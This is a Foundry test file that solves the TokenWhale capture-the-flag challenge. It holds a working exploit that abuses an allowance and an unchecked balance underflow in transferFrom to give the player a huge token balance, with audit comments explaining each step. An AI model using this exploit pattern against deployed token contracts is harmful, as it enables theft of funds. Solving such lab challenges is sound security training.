// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/TokenWhale.sol";

contract TokenWhaleTest is Test {
    TokenWhale public tokenWhale;
    ExploitContract public exploitContract;
    // Feel free to use these random addresses
    address constant Alice = address(0x5E12E7);
    address constant Bob = address(0x5311E8);
    address constant Pete = address(0x5E41E9);

    function setUp() public {
        // Deploy contracts
        tokenWhale = new TokenWhale(address(this));
        exploitContract = new ExploitContract(tokenWhale);
    }

    // Use the instance tokenWhale and exploitContract
    // Use vm.startPrank and vm.stopPrank to change between msg.sender
    function testExploit() public {
        tokenWhale.approve(Alice, 1000);
        tokenWhale.transfer(Alice, 501);
        // Alice has 501 tokens
        console.log(tokenWhale.balanceOf(Alice));
        // player address  = address(this) has 499 tokens
        console.log(tokenWhale.balanceOf(address(this)));

        // Approval 
        vm.prank(Alice);
        tokenWhale.approve(address(this), 1000);
        // Overflowing the player's address (499 < 501)
        // request of 501 tokens transfer 
        vm.prank(address(this));
        //@audit - This will call _transfer() which will : 
        // removes 501 tokens from address(this) balance but : 
        // address(this).balance = 499 tokens <= 501 tokens requested 
        // = UNDERFLOW 
        tokenWhale.transferFrom(Alice, Alice, 501);
        
        // Alice has 1002 tokens
        console.log(tokenWhale.balanceOf(Alice));
        console.log(tokenWhale.balanceOf(address(this)));

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenWhale.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
